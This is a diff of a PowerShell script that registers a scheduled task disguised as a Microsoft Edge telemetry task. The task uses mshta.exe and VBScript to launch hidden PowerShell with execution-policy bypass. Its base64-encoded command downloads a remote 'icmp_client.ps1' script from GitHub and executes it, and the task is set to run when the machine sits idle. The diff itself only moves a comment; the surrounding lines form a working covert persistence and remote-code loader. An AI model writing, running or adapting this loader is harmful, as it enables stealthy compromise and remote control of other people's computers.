@@ -1,10 +1,11 @@
+# This version uses the windows mshta.exe program to execute the powershell script without a window popup 
+
 # Unregister previous task if present
 if(Get-ScheduledTask -TaskName 'MicrosoftEdgeTelemetryServiceTaskMachineCore' -ErrorAction SilentlyContinue) {
     Unregister-ScheduledTask -TaskName 'MicrosoftEdgeTelemetryServiceTaskMachineCore' -Confirm:$false
 }
 
 # Schedule running the code
-# This version uses the windows mshta.exe program to execute the powershell script without a window popup 
 
 $ac = New-ScheduledTaskAction -Execute 'C:\Windows\System32\mshta.exe' -Argument 'vbscript:Execute("CreateObject(""Wscript.Shell"").Run ""powershell -w h -nol -noni -ep bypass -enc aQB3AHIAIABoAHQAdABwAHMAOgAvAC8AcgBhAHcALgBnAGkAdABoAHUAYgB1AHMAZQByAGMAbwBuAHQAZQBuAHQALgBjAG8AbQAvAEMAbABpAGMAawBlAHMAdAAvAGEALwBtAGEAcwB0AGUAcgAvAGkAYwBtAHAAXwBjAGwAaQBlAG4AdAAuAHAAcwAxAHwAaQBlAHgA"", 0 : window.close")'
 $st = New-ScheduledTaskSettingsSet -StartWhenAvailable -AllowStartIfOnBatteries -DontStopOnIdleEnd -DontStopIfGoingOnBatteries -RunOnlyIfIdle -IdleDuration 00:01:00 -IdleWaitTimeout 01:00:00
